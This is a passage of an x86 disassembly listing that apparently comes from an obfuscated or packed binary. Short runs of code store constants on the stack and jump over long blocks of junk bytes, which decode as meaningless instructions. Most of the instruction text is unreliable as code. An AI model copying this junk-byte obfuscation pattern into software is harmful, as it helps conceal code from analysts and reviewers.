  411110:	mov    DWORD PTR [ebp-0x7c],0x3321
  411117:	mov    DWORD PTR [ebp-0x70],0x7d00
  41111e:	mov    DWORD PTR [ebp-0x6c],0xd87
  411125:	mov    DWORD PTR [ebp-0x60],0x4197
  41112c:	mov    DWORD PTR [ebp-0x5c],0xa7d
  411133:	mov    DWORD PTR [ebp-0x50],0x772d
  41113a:	mov    DWORD PTR [ebp-0x4c],0x37d8
  411141:	mov    DWORD PTR [ebp-0x40],0x414a
  411148:	mov    DWORD PTR [ebp-0x3c],0x55ef
  41114f:	mov    DWORD PTR [ebp-0x30],0x136b
  411156:	mov    DWORD PTR [ebp-0x2c],0x53e4
  41115d:	mov    DWORD PTR [ebp-0x20],0x32d8
  411164:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  41116b:	mov    DWORD PTR [ebp-0xc],0x3956
  411172:	mov    DWORD PTR [ebp-0xa4],0x4e57
  41117c:	mov    DWORD PTR [ebp-0x94],0x1
  411186:	mov    DWORD PTR [ebp-0x14],0x17ab
  41118d:	mov    DWORD PTR [ebp-0x64],0x7a3d
  411194:	mov    DWORD PTR [ebp-0x54],0x378a
  41119b:	mov    DWORD PTR [ebp-0x74],0x5a00
  4111a2:	mov    DWORD PTR [ebp-0x24],0x1f3a
  4111a9:	mov    DWORD PTR [ebp-0x84],0x9a225
  4111b3:	mov    DWORD PTR [ebp-0x44],0x31f8
  4111ba:	mov    DWORD PTR [ebp-0x34],0x3663
  4111c1:	mov    DWORD PTR [ebp-0xb4],0x3165
  4111cb:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  4111d5:	mov    DWORD PTR [ebp-0xbc],0x43cc
  4111df:	jmp    0x411454
  4111e4:	mov    ecx,0x1c975440
  4111e9:	jnp    0x41119d
  4111eb:	push   ds
  4111ec:	jl     0x41125d
  4111ee:	mov    esi,DWORD PTR [eax-0x10]
  4111f1:	inc    ebp
  4111f2:	xchg   edi,eax
  4111f3:	mov    esp,0x18187cee
  4111f8:	jno    0x41120e
  4111fa:	sbb    BYTE PTR [eax],bl
  4111fc:	and    BYTE PTR [ebp+0x5806df12],ch
  411202:	repnz and BYTE PTR [eax],bh
  411205:	jnp    0x411189
  411207:	ja     0x41123e
  411209:	loopne 0x4111f6
  41120b:	jo     0x41128a
  41120d:	xor    BYTE PTR [eax-0x55],bh
  411210:	cs loopne 0x4111fb
  411213:	fiadd  DWORD PTR [esi*8+0x6d9f5a1f]
  41121a:	int    0x6a
  41121c:	pop    ebp
  41121d:	fmul   QWORD PTR [edi]
  41121f:	outs   dx,DWORD PTR ds:[esi]
  411220:	push   ebp
  411221:	sbb    WORD PTR [edi],ax
  411224:	push   0x20
  411226:	sub    BYTE PTR [esi+esi*4-0x5f4261fc],dl
  41122d:	mov    ah,0xbc
  41122f:	lods   al,BYTE PTR ds:[esi]
  411230:	test   al,0x7c
  411232:	and    al,0xa5
  411234:	xchg   ebp,eax
  411235:	arpl   sp,bx
  411237:	cmp    al,0x35
  411239:	mov    ecx,esi
  41123b:	ss jb  0x41123c
  41123e:	test   eax,0x845874bf
  411243:	loope  0x411222
  411245:	in     al,dx
  411246:	inc    ebx
  411247:	test   BYTE PTR [ecx-0x7808127],cl
  41124d:	push   ebx
  41124e:	mov    ch,BYTE PTR fs:[ebx+0x46]
  411252:	sbb    ebp,DWORD PTR [esi]
  411254:	sub    DWORD PTR [ebx+0x2b],0x69590964
  41125b:	fadd   st(1),st
  41125d:	out    dx,al
  41125e:	sbb    bh,ah
  411260:	sahf   
  411261:	daa    
  411262:	test   al,0xb5
  411264:	mov    bl,0x12
  411266:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411267:	fdivr  DWORD PTR [edi-0x7b]
  41126a:	push   esp
  41126b:	loopne 0x4112d4
  41126d:	cs xchg edi,eax
  41126f:	and    eax,0x4d5f3107
  411274:	icebp  
  411275:	cwde   
  411276:	jne    0x41121f
  411278:	xor    ebx,esi
  41127a:	inc    ebx
  41127b:	mov    ah,0xfb
  41127d:	and    BYTE PTR [ebx],bl
  41127f:	xor    ah,bh
  411281:	adc    al,0x53
  411283:	inc    edx
  411284:	ins    BYTE PTR es:[edi],dx
  411285:	pop    ecx
  411286:	(bad)  
  411287:	jne    0x411263
  411289:	push   edi
  41128a:	out    0xe2,al
  41128c:	imul   ebp,DWORD PTR [esi-0x29],0xe8c21471
  411293:	ret    0x26ee
  411296:	test   ah,0x20
  411299:	repz test BYTE PTR gs:[eax],dl
  41129d:	push   ds
  41129e:	mov    BYTE PTR [edi-0x7d03b866],dl
  4112a4:	jmp    0x41131f
  4112a6:	outs   dx,BYTE PTR ds:[esi]
  4112a7:	sbb    dh,BYTE PTR [ecx-0x7a491376]
  4112ad:	pop    esi
  4112ae:	cmp    DWORD PTR [esi],ebp
  4112b0:	fistp  WORD PTR [esi-0x2b]
  4112b3:	in     eax,0xad
  4112b5:	mov    ch,0x4e
  4112b7:	ds pop ebx
  4112b9:	inc    ebx
  4112ba:	lods   al,BYTE PTR ds:[esi]
  4112bb:	mov    ss,edi
  4112bd:	shl    BYTE PTR [ecx+0x70fa0366],0xbd
  4112c4:	add    al,0x20
  4112c6:	jmp    0x4112eb
  4112c8:	mov    dh,0x12
  4112ca:	call   0x62eb5a7c
  4112cf:	pusha  
  4112d0:	arpl   WORD PTR [ecx],ax
  4112d2:	ds cmp eax,0xb6d64733
  4112d8:	sbb    al,0x4b
  4112da:	adc    bh,ch
  4112dc:	jno    0x4112ee
  4112de:	outs   dx,DWORD PTR ds:[esi]
  4112df:	enter  0x9beb,0xc
  4112e3:	sahf   
  4112e4:	ds fmul st(6),st
  4112e7:	inc    edi
  4112e8:	lock test eax,0xd02cfc9
  4112ee:	icebp  
  4112ef:	and    al,BYTE PTR [ebx+0x32d0cee6]
  4112f5:	cmp    eax,0x1dc72a63
  4112fa:	fucom  st(1)
  4112fc:	stc    
  4112fd:	repnz gs pop esi
  411300:	cmp    BYTE PTR [esp+ecx*2],ah
  411303:	daa    
  411304:	mov    esp,0x893366eb
  411309:	fild   DWORD PTR [edx]
  41130b:	push   esi
  41130c:	(bad)  
  41130d:	sbb    bl,BYTE PTR [edx-0x54ba1e4a]
  411313:	ret    
  411314:	popf   
  411315:	iret   
  411316:	push   eax
  411317:	jecxz  0x411365
  411319:	cmc    
  41131a:	or     DWORD PTR [esi+0x33],esi
  41131d:	push   edi
  41131e:	xor    DWORD PTR [ebx+ebx*8-0x19],edx
  411322:	inc    edi
  411323:	ss aam 0xdd
  411326:	(bad)  
  411327:	icebp  
  411328:	push   es
  411329:	sar    BYTE PTR [ebx-0x52],1
  41132c:	push   ds
  41132d:	pop    ebx
  41132e:	dec    ecx
  41132f:	sub    al,0xae
  411331:	sub    al,0x36
  411333:	cmp    BYTE PTR [eax],dl
  411335:	sub    DWORD PTR [eax],0xf
  411338:	xor    DWORD PTR fs:[ecx],0xffffff9a
  41133c:	std    
  41133d:	push   ds
  41133e:	bound  esi,QWORD PTR [edx]
  411340:	imul   edi,DWORD PTR es:[ecx+0x6af5dda2],0x72a2026c
  41134b:	cmp    ebp,esi
  41134d:	imul   esp,DWORD PTR [ecx],0x761d5fcb
  411353:	adc    edi,esi
  411355:	lds    edi,FWORD PTR [ecx]
  411357:	rcr    DWORD PTR [edi+0x37dbac37],cl
  41135d:	aas    
  41135e:	sbb    BYTE PTR [edi+0x1fd048b7],cl
  411364:	div    ebp
  411366:	dec    ecx
  411367:	sub    eax,0x39380e43
  41136c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41136d:	lods   al,BYTE PTR ds:[esi]
  41136e:	icebp  
  41136f:	mov    al,0x79
  411371:	sub    edi,ecx
  411373:	jae    0x41138c
  411375:	sbb    dl,ah
  411377:	icebp  
  411378:	push   ss
  411379:	adc    al,0xb2
  41137c:	mov    WORD PTR [ebp+eiz*4-0x7064ca4f],ss
  411383:	mov    esi,0xf415ebeb
  411388:	ret    
  411389:	lods   eax,DWORD PTR ds:[esi]
  41138a:	push   ebp
  41138b:	or     bl,BYTE PTR [esi-0x32]
  41138e:	scas   eax,DWORD PTR es:[edi]
  41138f:	clc    
  411390:	inc    ebp
  411391:	push   eax
  411392:	in     al,dx
  411393:	push   0xebaa1ed4
  411398:	xchg   ebp,eax
  411399:	fcomp  DWORD PTR [edx*8+0x6a303822]
  4113a0:	and    BYTE PTR [ebp-0x16f1a388],bh
  4113a6:	sbb    al,0xa5
  4113a8:	sbb    DWORD PTR [esi],ebx
  4113aa:	jnp    0x411391
  4113ac:	enter  0xefa6,0xbe
  4113b0:	mov    ds:0x6aaf7722,eax
  4113b5:	dec    eax
  4113b6:	inc    ecx
  4113b7:	test   BYTE PTR [ebp+0x165fe515],ch
  4113bd:	add    BYTE PTR [ebx-0xc],0xe1
  4113c1:	aad    0x75
  4113c3:	xor    eax,0xa12b8ae8
  4113c8:	les    ecx,FWORD PTR [edi-0x21]
  4113cb:	push   edx
  4113cc:	outs   dx,BYTE PTR ds:[esi]
  4113cd:	push   eax
  4113ce:	cs jb  0x4113bb
  4113d1:	retf   
  4113d2:	pop    ss
  4113d3:	fnstenv [edi-0xd45e02]
  4113d9:	pop    eax
  4113da:	mov    bh,0x99
  4113dc:	and    cl,0x57
  4113df:	or     ecx,DWORD PTR [edx+0x7a7055d1]
  4113e5:	jl     0x41138c
  4113e7:	cmp    ch,BYTE PTR [edx]
  4113e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113ea:	xchg   ebx,eax
  4113eb:	(bad)  
  4113ec:	mov    WORD PTR [ecx+0x608555ec],ds
  4113f2:	xchg   edx,eax
  4113f3:	dec    esi
  4113f4:	adc    eax,0xd1238493
  4113f9:	cmp    DWORD PTR [ebx-0x23],ebp
  4113fc:	dec    edi
  4113fd:	dec    edi
  4113fe:	mov    esp,esi
  411400:	dec    ecx
  411401:	cli    
  411402:	imul   ebx,DWORD PTR [edx+0x192daf3c],0x2b455594
  41140c:	adc    eax,0x82051643
  411411:	test   eax,0xb81af5d7
  411416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411417:	movzx  edx,WORD PTR [edi+0x2c]
  41141b:	pop    edx
  41141c:	repz xor esi,0x4c
  411420:	add    edx,edi
  411422:	shl    DWORD PTR [ecx-0x5b6c3cc0],1
  411428:	sbb    dh,BYTE PTR [edx]
  41142a:	lods   al,BYTE PTR ds:[esi]
  41142b:	pop    esi
  41142c:	cmp    BYTE PTR [ebx+0xa040d8b],bh
  411432:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411433:	(bad)  
  411435:	test   cl,ah
  411437:	xchg   esp,eax
  411438:	dec    edx
  411439:	fsub   QWORD PTR [esi+0x6]
  41143c:	not    edi
  41143e:	and    eax,0x29f13064
  411443:	daa    
  411444:	or     cl,dh
  411446:	or     al,0x4f
  411448:	xor    ah,bh
  41144a:	aas    
  41144b:	jl     0x411419
  41144d:	imul   ebx,DWORD PTR [ebx-0x5efed8d4],0xc
  411454:	mov    DWORD PTR [ebp-0xb0],0x7564
  41145e:	mov    DWORD PTR [ebp-0xac],0x18cf
  411468:	mov    DWORD PTR [ebp-0xa0],0x3135
  411472:	mov    DWORD PTR [ebp-0x9c],0x568d
  41147c:	mov    DWORD PTR [ebp-0x90],0x11f2
  411486:	mov    DWORD PTR [ebp-0x8c],0x63ea
  411490:	mov    DWORD PTR [ebp-0x10],0x3066
  411497:	mov    DWORD PTR [ebp-0x8],0x6ed2
  41149e:	push   0x7e1d
  4114a3:	jmp    0x411718
  4114a8:	dec    edi
  4114a9:	sub    bl,BYTE PTR [edx+0x3b209ab0]
  4114af:	sub    dl,BYTE PTR [eax+0x227e2188]
  4114b5:	mov    BYTE PTR ds:0x1878476a,dh
  4114bb:	sbb    BYTE PTR [ecx+0x14],dh
  4114be:	sbb    BYTE PTR [eax],bl
  4114c0:	xchg   edi,eax
  4114c1:	sahf   
  4114c2:	jle    0x4114ea
  4114c4:	dec    edi
  4114c5:	jnp    0x411480
  4114c7:	dec    ebx
  4114c8:	push   0x35f9876
  4114cd:	pop    es
  4114ce:	xchg   ebx,eax
  4114cf:	inc    esi
  4114d0:	mov    ch,0xb8
  4114d2:	sub    eax,0x32b81260
  4114d7:	adc    al,0x44
  4114d9:	mov    dl,0xcc
  4114db:	and    BYTE PTR [edi-0x23],bl
  4114de:	dec    edx
  4114df:	fisttp WORD PTR [ebp+0x3b]
  4114e2:	out    0xe,al
  4114e4:	pop    ebx
  4114e5:	jmp    0xbbfc:0x60504406
  4114ec:	and    al,0xa5
  4114ee:	call   0x1f91:0x2dc67837
  4114f5:	ins    BYTE PTR es:[edi],dx
  4114f6:	imul   edi,DWORD PTR [eax-0x5872d7c6],0x3fdf85da
  411500:	ins    BYTE PTR es:[edi],dx
  411501:	shl    DWORD PTR [edx],1
  411503:	inc    edx
  411504:	fild   QWORD PTR [esi-0x8]
  411507:	push   edi
  411508:	dec    edx
  411509:	xchg   ebx,eax
  41150a:	jge    0x411560
  41150c:	mov    esi,0xe6d2e179
  411511:	pop    DWORD PTR [edi-0x6041b965]
  411517:	call   0x5904070b
  41151c:	pushf  
  41151d:	push   ds
  41151e:	outs   dx,BYTE PTR ds:[esi]
  41151f:	add    eax,0x1373d6ef
  411524:	and    BYTE PTR [ecx-0x10d2202f],bh
  41152a:	push   ecx
  41152b:	stc    
  41152c:	push   ebx
  41152d:	mov    al,0x6d
  41152f:	or     al,0xa7
  411531:	dec    ecx
  411532:	mov    ah,0xd2
  411534:	pop    ds
  411535:	aam    0xb1
  411537:	icebp  
  411538:	ins    DWORD PTR es:[edi],dx
  411539:	mov    al,ds:0xcd956848
  41153e:	nop
  41153f:	add    DWORD PTR [edi+ecx*8-0x435e670a],ebp
  411546:	ret    
  411547:	jnp    0x411585
  411549:	cmp    ebp,DWORD PTR [ebx]
  41154b:	ds icebp 
  41154d:	cmp    edx,ebx
  41154f:	jnp    0x4114e6
  411551:	psubw  mm4,QWORD PTR [edx]
  411554:	call   0xdc63:0xe4c0d815
  41155b:	push   ds
  41155c:	push   eax
  41155d:	ds dec edx
  41155f:	ret    
  411560:	sbb    bh,BYTE PTR [esi-0x1caa2c8a]
  411566:	ret    0xeff9
  411569:	and    eax,0x5645bfcb
  41156e:	fdiv   QWORD PTR [edi-0x5b]
  411571:	pusha  
  411572:	push   esi
  411573:	lds    edx,FWORD PTR [edi+0x43]
  411576:	mov    ebx,0x8fcb52c2
  41157b:	pop    es
  41157c:	mov    BYTE PTR [edx-0x1a],bl
  41157f:	jo     0x4115fd
  411581:	pop    ecx
  411582:	inc    edi
  411583:	mov    ds:0xfb88784,eax
  411588:	(bad)  
  411589:	and    ebp,edx
  41158b:	stos   BYTE PTR es:[edi],al
  41158c:	sub    ebx,DWORD PTR [ecx+0x2b]
  41158f:	push   edi
  411590:	ja     0x411531
  411592:	repz xchg ebx,eax
  411594:	fimul  DWORD PTR [edx+edx*2-0x52]
  411598:	(bad)
  41159c:	jg     0x4115a5
  41159e:	jl     0x4115b0
  4115a0:	imul   ebx
  4115a2:	arpl   WORD PTR [edx+edi*4-0x1e],sp
  4115a6:	cmp    al,0x79
  4115a8:	mov    dh,0xec
  4115aa:	sbb    al,0x5b
  4115ac:	shr    DWORD PTR [ebx+0x3d],0x4a
  4115b0:	jns    0x411549
  4115b2:	sar    BYTE PTR [ecx],1
  4115b4:	aaa    
  4115b5:	pop    edx
  4115b6:	das    
  4115b7:	out    dx,eax
  4115b8:	loop   0x41158c
  4115ba:	inc    ecx
  4115bb:	cmp    DWORD PTR [edi-0x5f],0xfaa4e5a8
  4115c2:	mov    cs,WORD PTR [esi+0x6c]
  4115c5:	pop    ebx
  4115c6:	popa   
  4115c7:	sahf   
  4115c8:	add    BYTE PTR [esp+eiz*2],cl
  4115cb:	js     0x4115c9
  4115cd:	sub    DWORD PTR [ecx-0x1c],eax
  4115d0:	std    
  4115d1:	aaa    
  4115d2:	sbb    DWORD PTR [ebx-0x2828ff5e],0xdc8d5c70
  4115dc:	inc    eax
  4115dd:	icebp  
  4115de:	mov    ds:0xfec285aa,al
  4115e3:	shl    DWORD PTR [ecx],cl
  4115e5:	test   DWORD PTR ds:0xc3d6b262,esi
  4115eb:	pop    edi
  4115ec:	jno    0x41164b
  4115ee:	mov    al,0xd8
  4115f0:	out    dx,eax
  4115f1:	dec    ebx
  4115f2:	in     al,dx
  4115f3:	push   eax
  4115f4:	mov    esp,0x57058370
  4115f9:	cmp    DWORD PTR [ebp+0x6c],esp
  4115fc:	into   
  4115fd:	mov    WORD PTR [esi+0x72],es
  411600:	push   0xd214db49
  411605:	into   
  411606:	inc    ebp
  411607:	lods   al,BYTE PTR ds:[esi]
  411608:	lds    esp,FWORD PTR [edx-0x5a95476f]
  41160e:	xchg   ecx,eax
  41160f:	mov    DWORD PTR [esp+ebp*4+0xa7a7f1d],0xd92f2625
  41161a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41161b:	les    edx,FWORD PTR [esi]
  41161d:	(bad)  [edi-0x1a]
  411620:	daa    
  411621:	test   eax,0x26da74ab
  411626:	xor    al,0x7f
  411628:	sub    ebx,DWORD PTR [edx+0x3b2a18a7]
  41162e:	les    edi,FWORD PTR [ecx-0x62]
  411631:	(bad)  
  411632:	fiadd  WORD PTR [esi]
  411634:	mov    eax,DWORD PTR [edx-0x64]
  411637:	push   esp
  411638:	push   edi
  411639:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41163b:	loop   0x4116a1
  41163d:	jp     0x4116ab
  41163f:	pop    eax
  411640:	bound  ebx,QWORD PTR [edx+eiz*4]
  411643:	pop    ds
  411644:	xor    al,0x4d
  411646:	cmp    ah,BYTE PTR [esi+0x2c016f87]
  41164c:	retf   0x5dbf
  41164f:	cmp    BYTE PTR [ebx+0x36],bl
  411652:	cld    
  411653:	loopne 0x411640
  411655:	inc    ebx
  411656:	mov    dh,0x83
  411658:	and    eax,DWORD PTR [eax+ebp*8]
  41165b:	push   0xcd01be22
  411660:	mov    WORD PTR [edx-0x52],es
  411663:	xchg   ecx,eax
  411664:	xor    ah,BYTE PTR [esi+ebx*2+0x5c28f1f5]
  41166b:	femms  
  41166d:	cmc    
  41166e:	and    DWORD PTR [edx],0xffffffbf
  411671:	cld    
  411672:	or     eax,0x13d339c4
  411677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411678:	mov    bl,0x4e
  41167a:	or     al,0xe1
  41167c:	into   
  41167d:	mov    esp,DWORD PTR [ecx-0x6d]
  411680:	pop    ebx
  411681:	loop   0x4116b8
  411683:	sub    dl,BYTE PTR [ebp-0x2599db4f]
  411689:	add    esi,DWORD PTR cs:[ebx+0x55]
  41168d:	fmul   DWORD PTR [edx]
  41168f:	xchg   ecx,eax
  411690:	mov    al,cs:0x694a6579
  411696:	add    ebp,DWORD PTR [edx]
  411698:	mov    esp,0xdc4489fe
  41169d:	xchg   esp,eax
  41169e:	xor    esp,DWORD PTR [esi-0x71b13aeb]
  4116a4:	sbb    BYTE PTR [edi+0x77],bh
  4116a7:	inc    esi
  4116a8:	xchg   edi,eax
  4116a9:	cmp    BYTE PTR [ebx+0x78ff0abe],ah
  4116af:	dec    esp
  4116b0:	rcr    edx,0x48
  4116b3:	and    eax,0xfd92df20
  4116b8:	adc    al,0x4c
  4116ba:	sti    
  4116bb:	and    bh,ch
  4116bd:	sub    ecx,esp
  4116bf:	cmp    dh,cl
  4116c1:	adc    edx,DWORD PTR [ecx-0x15]
  4116c4:	mov    DWORD PTR [edi+0x5c],ebx
  4116c7:	shr    DWORD PTR [edi],0x28
  4116ca:	pop    esi
  4116cb:	mov    eax,ds:0xf9afe74d
  4116d0:	push   esp
  4116d1:	jl     0x411704
  4116d3:	mov    BYTE PTR [ecx+0x5684ac9c],al
  4116d9:	test   BYTE PTR [ebp-0x3f28458c],0xa7
  4116e0:	dec    edi
  4116e1:	es sbb eax,0xd42923f5
  4116e7:	inc    edx
  4116e8:	(bad)  
  4116e9:	adc    eax,0xe5f989d7
  4116ee:	and    al,0x5b
  4116f0:	cmc    
  4116f1:	call   0x2054b355
  4116f6:	cdq    
  4116f7:	pop    ecx
  4116f8:	mov    ecx,0x645cace
  4116fd:	test   DWORD PTR [esi+0x4b],eax
  411700:	mov    bl,0x71
  411702:	fistp  DWORD PTR [edx+0x461d1b65]
  411708:	(bad)  
  41170a:	mov    WORD PTR [edi+0x17],fs
  41170d:	out    dx,eax
  41170e:	fistp  DWORD PTR [eax-0xaf6bdc8]
  411714:	xor    eax,DWORD PTR ds:0x45c7cc8e
  41171a:	cld    
  41171b:	hlt    
  41171c:	xor    BYTE PTR [eax],al
  41171e:	add    BYTE PTR [ebx+0x4d8be045],cl
  411724:	in     al,0x68
  411726:	adc    BYTE PTR [ebx+0x0],0x0
  41172a:	push   ecx
  41172b:	push   eax
  41172c:	call   0x416c20
  411731:	mov    ecx,eax
  411733:	mov    eax,DWORD PTR [ebp-0x30]
  411736:	xor    ecx,eax
  411738:	mov    esi,edx
  41173a:	mov    edx,DWORD PTR [ebp-0x2c]
  41173d:	mov    eax,DWORD PTR [ebp-0x40]
  411740:	xor    esi,edx
  411742:	jmp    0x4119b7
  411747:	lds    edi,FWORD PTR [ecx]
  411749:	fisubr WORD PTR [ebp+0x5a]
  41174c:	sbb    al,BYTE PTR [edx+0x21]
  41174f:	pusha  
  411750:	mov    al,ds:0x49ccaa57
  411755:	ja     0x4117d3
  411757:	sahf   
  411758:	je     0x411772
  41175a:	sbb    BYTE PTR [ecx+0x14],dh
  41175d:	sbb    BYTE PTR [eax],bl
  41175f:	scas   eax,DWORD PTR es:[edi]
  411760:	mov    eax,ds:0xd98cde93
  411765:	(bad)  
  411766:	in     eax,0x5
  411768:	xchg   ebp,esi
  41176a:	and    ah,cl
  41176c:	pop    esp
  41176d:	scas   eax,DWORD PTR es:[edi]
  41176e:	bound  edx,QWORD PTR gs:[esi+ebx*4]
  411772:	add    DWORD PTR [edx],esp
  411774:	pop    eax
  411775:	dec    ecx
  411776:	out    0x4e,al
  411778:	and    al,0x79
  41177a:	xchg   ebp,eax
  41177b:	xchg   ebp,eax
  41177c:	imul   ebp,DWORD PTR [ecx*1+0x208ed762],0x661d8c69
  411787:	push   ecx
  411788:	jp     0x4117fd
  41178a:	or     esp,DWORD PTR [eax+0x7ae139d3]
  411790:	stos   BYTE PTR es:[edi],al
  411791:	adc    esp,eax
  411793:	cmp    DWORD PTR [ecx],eax
  411795:	push   eax
  411796:	fnstcw WORD PTR [esp+ecx*8+0x78]
  41179a:	adc    al,0x7
  41179c:	jge    0x411745
  41179e:	or     cl,BYTE PTR [edi]
  4117a0:	cmp    esp,DWORD PTR [ecx+0xc]
  4117a3:	pop    esp
  4117a4:	or     bh,BYTE PTR [eax+ebp*4-0x5fea7c2b]
  4117ab:	fistp  QWORD PTR [esi+0x22]
  4117ae:	mov    dh,0xd8
  4117b0:	cmp    bl,BYTE PTR [ebx+0x7bf62bd0]
  4117b6:	and    BYTE PTR ds:0x7289ea59,dl
  4117bc:	int3   
  4117bd:	mov    edi,0xf8c61b02
  4117c2:	sub    BYTE PTR [ebp-0xf],cl
  4117c5:	fwait
  4117c6:	cmp    bl,BYTE PTR [edi-0x7703d65a]
  4117cc:	xchg   esp,eax
  4117cd:	jmp    0x4dca:0x5606820f
  4117d4:	mov    ebx,0x366ddad
  4117d9:	rcl    DWORD PTR [eax-0x1e],1
  4117dc:	add    al,dh
  4117de:	jge    0x411760
  4117e0:	sub    eax,0x30822d87
  4117e5:	adc    bh,BYTE PTR [edi+0x68ba809]
  4117eb:	or     BYTE PTR [eax+0x63],dl
  4117ee:	inc    esp
  4117ef:	ds in  eax,dx
  4117f1:	sbb    al,0x4d
  4117f3:	cmp    DWORD PTR [edx+0x8],ecx
  4117f6:	mov    esp,0x98aaedd3
  4117fb:	rcl    BYTE PTR [ebp+0x4d],0xf7
  4117ff:	sbb    BYTE PTR [ebx],0xf9
  411802:	enter  0x609a,0x37
  411806:	inc    ebx
  411807:	adc    eax,DWORD PTR [esi+0x7b6b1def]
  41180d:	pop    esp
  41180e:	push   cs
  41180f:	add    eax,0x6927a601
  411814:	out    dx,eax
  411815:	popa   
  411816:	and    BYTE PTR [ecx],ah
  411818:	imul   ebp,DWORD PTR [edx+0x7bef027],0x3
  41181f:	mov    esp,0xd241e2b3
  411824:	loope  0x411872
  411826:	rcr    BYTE PTR [edx+0x6b1edb57],0x23
  41182d:	lods   eax,DWORD PTR ds:[esi]
  41182e:	call   0xbe900a66
  411833:	call   0xaebb33da
  411838:	jne    0x411827
  41183a:	test   eax,0x3da15bc3
  41183f:	mov    dh,0xa
  411841:	out    dx,eax
  411842:	mov    dl,0x56
  411844:	sub    DWORD PTR [eax+0x42],ebx
  411847:	repnz mov edi,0xa7358391
  41184d:	loop   0x4118ca
  41184f:	push   eax
  411850:	jno    0x4118a3
  411852:	inc    edi
  411853:	sbb    bh,BYTE PTR [esi+0x4786d39b]
  411859:	push   ss
  41185a:	sbb    esp,esp
  41185c:	jo     0x41184a
  41185e:	sub    eax,0xf879c417
  411863:	push   cs
  411864:	jne    0x411828
  411866:	mov    al,ds:0x6a732912
  41186b:	scas   eax,DWORD PTR es:[edi]
  41186c:	mov    edx,0x500453b5
  411871:	adc    eax,0x3a910b61
  411876:	sub    al,0x6b
  411878:	cwde   
  411879:	mov    bl,0xb0
  41187b:	and    eax,0x3293e5d1
  411880:	adc    ch,BYTE PTR [ebx-0x21a08e44]
  411886:	fild   QWORD PTR [esi-0x20d4c6d8]
  41188c:	dec    ecx
  41188d:	add    eax,0xb7484c31
  411892:	retf   
  411893:	sub    ah,bh
  411895:	fiadd  DWORD PTR [edx-0xbcda36d]
  41189b:	rcr    DWORD PTR [ebx],1
  41189d:	cmp    al,0xb2
  41189f:	add    ah,dh
  4118a1:	or     eax,0xc52d58c7
  4118a6:	xor    DWORD PTR [ecx+0x20],esp
  4118a9:	loop   0x411880
  4118ab:	or     al,0xca
  4118ad:	(bad)  
  4118ae:	cmp    al,0xfd
  4118b0:	fprem1 
  4118b2:	into   
  4118b3:	cmp    BYTE PTR [ecx+0x67],bh
  4118b6:	clc    
  4118b7:	(bad)
  4118ba:	adc    BYTE PTR [ecx+edx*4-0x1406f8e2],ch
  4118c1:	scas   eax,DWORD PTR es:[edi]
  4118c2:	xchg   edx,eax
  4118c3:	push   ss
  4118c4:	fild   QWORD PTR [edi-0x67]
  4118c8:	mov    bl,0x68
  4118ca:	cwde   
  4118cb:	sub    eax,0x6d30a1f4
  4118d0:	es cmp al,0x0
  4118d3:	cld    
  4118d4:	cmc    
  4118d5:	clc    
  4118d6:	sub    ah,BYTE PTR [eax]
  4118d8:	sub    ebx,DWORD PTR [ecx-0x262538e5]
  4118de:	inc    edi
  4118df:	mov    al,0xc0
  4118e1:	stc    
  4118e2:	ret    
  4118e3:	hlt    
  4118e4:	int3   
  4118e5:	gs xchg esp,eax
  4118e7:	in     al,0x4a
  4118e9:	in     al,dx
  4118ea:	jns    0x4118e4
  4118ec:	dec    ebp
  4118ed:	sti    
  4118ee:	out    0xbb,eax
  4118f0:	pop    ss
  4118f1:	test   DWORD PTR [esi+0x31],0x2eeecfc9
  4118f8:	fs jae 0x411947
  4118fb:	adc    DWORD PTR [ebp*8+0x429e6bd4],ebp
  411902:	outs   dx,DWORD PTR ds:[esi]
  411903:	jbe    0x411965
  411905:	push   esp
  411906:	mov    fs,WORD PTR [ecx+0x76357191]
  41190c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41190d:	push   es
  41190e:	outs   dx,DWORD PTR ds:[esi]
  41190f:	aaa    
  411910:	call   0xb6478793
  411915:	pop    esi
  411916:	mov    eax,0x4ada70f0
  41191b:	imul   ebp,DWORD PTR [ebp-0x2b],0x7f
  41191f:	pop    eax
  411920:	mov    ds:0x8b894c25,al
  411925:	pop    esp
  411926:	and    al,0x37
  411928:	sub    eax,0x1f375bec
  41192d:	xchg   esi,eax
  41192e:	out    dx,eax
  41192f:	and    al,0xba
  411931:	ficom  WORD PTR [ebp-0x27]
  411934:	mov    ebx,0xf3d3c462
  411939:	push   ebp
  41193a:	xchg   edx,eax
  41193b:	jns    0x41190b
  41193d:	ret    
  41193e:	ror    DWORD PTR [eax],1
  411940:	icebp  
  411941:	fwait
  411942:	inc    ebp
  411943:	cmp    esi,ebp
  411945:	xor    DWORD PTR [edi],edx
  411947:	imul   DWORD PTR [edi+0x76]
  41194a:	out    0x19,eax
  41194c:	cwde   
  41194d:	push   ds
  41194e:	out    0x81,eax
  411950:	test   al,0x28
  411952:	je     0x4118de
  411954:	hlt    
  411955:	jb     0x41191f
  411957:	mov    al,ds:0xb5197f8b
  41195c:	loope  0x41190e
  41195e:	psubsb mm0,mm7
  411961:	xor    BYTE PTR [ecx-0x41],0xac
  411965:	loope  0x41190b
  411967:	jle    0x4119a4
  411969:	loop   0x411925
  41196b:	xchg   BYTE PTR [ecx],bl
  41196d:	mov    edx,0x2eb44849
  411972:	daa    
  411973:	in     eax,dx
  411974:	cmp    BYTE PTR [edx],0xe1
  411977:	pop    edx
  411978:	jg     0x41197d
  41197a:	xor    BYTE PTR [esi-0x176363ae],0x59
  411981:	scas   eax,DWORD PTR es:[edi]
  411982:	pop    esi
  411983:	pop    ss
  411984:	push   ebp
  411985:	ins    BYTE PTR es:[edi],dx
  411986:	mov    cl,0x70
  411988:	push   ebx
  411989:	aaa    
  41198a:	dec    ebp
  41198b:	dec    ecx
  41198c:	cmp    al,0x87
  41198e:	xchg   ecx,eax
  41198f:	int3   
  411990:	out    0x69,al
  411992:	rol    cl,0xbf
  411995:	sahf   
  411996:	lods   al,BYTE PTR ds:[esi]
